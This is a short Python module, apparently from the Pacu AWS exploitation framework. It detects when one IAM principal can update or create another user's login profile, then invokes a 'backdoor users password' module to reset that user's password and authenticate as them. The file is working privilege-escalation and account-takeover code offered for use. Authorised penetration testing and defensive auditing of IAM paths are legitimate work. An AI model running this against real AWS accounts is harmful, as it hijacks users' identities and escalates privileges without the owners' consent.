from modules.iam__pivot_v2.common import Escalation
from . import IamEscalationChecker

from principalmapper.common.edges import Edge
from principalmapper.querying.query_interface import local_check_authorization_handling_mfa as local_check_auth_mfa, Node


def ChangeUserPassword(pacu_main, print, input, fetch_data, target: Node, source: Node):
    print('  Starting method UpdateLoginProfile...\n')
    username = target.arn.split('/')[-1]
    fetch_data(None, 'iam__backdoor_users_password', '--update --usernames {}'.format(username), force=True)


@IamEscalationChecker.register_user_escalation()
def change_user_password(source: Node, dest: Node) -> Edge:
    if dest.active_password:
        pass_auth_res, mfa_res = local_check_auth_mfa(source, 'iam:UpdateLoginProfile', dest.arn, {})
    else:
        pass_auth_res, mfa_res = local_check_auth_mfa(source, 'iam:CreateLoginProfile', dest.arn, {})
    if pass_auth_res:
        reason = 'can set the password to authenticate as'
        if mfa_res:
            reason = '(MFA required) ' + reason
        return Escalation(source, dest, escalate_func=ChangeUserPassword, reason=reason)
